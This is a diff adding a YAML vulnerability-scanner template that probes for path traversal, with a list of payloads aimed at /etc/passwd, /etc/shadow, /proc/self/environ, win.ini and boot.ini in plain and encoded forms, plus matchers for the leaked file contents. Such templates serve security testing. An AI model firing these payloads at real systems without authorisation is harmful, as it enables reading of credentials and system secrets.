@@ -1,0 +1,93 @@
+# templates/path-traversal/path-traversal-basic.yaml
+id: path-traversal-basic
+info:
+  name: Path Traversal File Access Detection
+  author: webx-elite
+  severity: high
+  description: Detects path traversal vulnerabilities allowing access to sensitive files
+  tags:
+    - path-traversal
+    - directory-traversal
+    - file-access
+    - owasp-top10
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+
+vulnerability_type: path-traversal
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{traversal_payload}}"
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[drivers\\]"
+          - "\\[boot loader\\]"
+        part: body
+        
+      - type: word
+        words:
+          - "daemon:x:"
+          - "bin:x:"
+          - "sys:x:"
+          - "sync:x:"
+          - "games:x:"
+          - "man:x:"
+          - "mail:x:"
+          - "news:x:"
+          - "uucp:x:"
+        part: body
+        condition: or
+        
+      - type: word
+        words:
+          - "[boot loader]"
+          - "[operating systems]"
+          - "[system.ini]"
+          - "boot.ini"
+          - "win.ini"
+        part: body
+        condition: or
+
+payloads:
+  # Linux/Unix file access
+  - "../../../etc/passwd"
+  - "../../../../etc/passwd"
+  - "../../../../../etc/passwd"
+  - "../../../../../../etc/passwd"
+  - "../../../etc/shadow"
+  - "../../../etc/hosts"
+  - "../../../proc/version"
+  - "../../../proc/self/environ"
+  
+  # Windows file access
+  - "..\\..\\..\\windows\\win.ini"
+  - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  - "../../../windows/win.ini"
+  - "../../../windows/system.ini"
+  - "../../../boot.ini"
+  - "..\\..\\..\\boot.ini"
+  
+  # URL encoded variations
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "..%2f..%2f..%2fetc%2fpasswd"
+  - "%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini"
+  
+  # Double URL encoded
+  - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+  - "%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini"
+  
+  # Mixed encoding
+  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  - "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+
+encoders:
+  - url
+  - double_url
+  - path_traversal
